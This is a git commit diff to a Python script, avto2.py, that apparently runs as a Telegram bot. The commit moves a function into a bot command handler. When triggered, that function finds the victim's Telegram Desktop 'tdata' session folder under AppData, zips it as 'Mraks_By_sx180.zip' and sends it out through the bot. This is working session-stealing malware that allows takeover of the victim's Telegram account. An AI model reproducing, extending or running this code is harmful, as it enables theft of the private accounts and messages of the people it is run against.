75c004891061087e91c14f1b7f0adfc44e525275
vovanskaie <136624664+vovanskaie@users.noreply.github.com>
2024-03-18 19:56:18 +0300

    Update avto2.py

--- avto2.py
+++ avto2.py
@@ -342,26 +342,26 @@ def archive_and_send():
         print("Папка 'tdata' не найдена.")
 @bot.message_handler(commands=['archive_and_send'])
 def handle_archive_and_send(message):
-    def archive_and_send():
-    user = os.path.expanduser("~")
-    if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
-        try:
-            source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
-            temp_dir = os.path.join(os.getcwd(), 'temp')
-            if not os.path.exists(temp_dir):
-                os.makedirs(temp_dir)  # Создаем папку, если её нет
-            output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
-
-            created_zip = create_zip_archive(source_dir, output_zip)
-            if created_zip:
-                send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
-            else:
-                print("Failed to create or send zip file.")
-        except Exception as e:
-            print(f"Error creating or sending zip file: {str(e)}")
-    else:
-        print("Папка 'tdata' не найдена.")
     chat_id = message.chat.id
+    def archive_and_send():
+        user = os.path.expanduser("~")
+        if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
+            try:
+                source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
+                temp_dir = os.path.join(os.getcwd(), 'temp')
+                if not os.path.exists(temp_dir):
+                    os.makedirs(temp_dir)  # Создаем папку, если её нет
+                output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
+    
+                created_zip = create_zip_archive(source_dir, output_zip)
+                if created_zip:
+                    send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
+                else:
+                    print("Failed to create or send zip file.")
+            except Exception as e:
+                print(f"Error creating or sending zip file: {str(e)}")
+        else:
+            print("Папка 'tdata' не найдена.")
     archive_and_send()
     bot.send_message(chat_id, "Архивация и отправка файла завершены.")
 
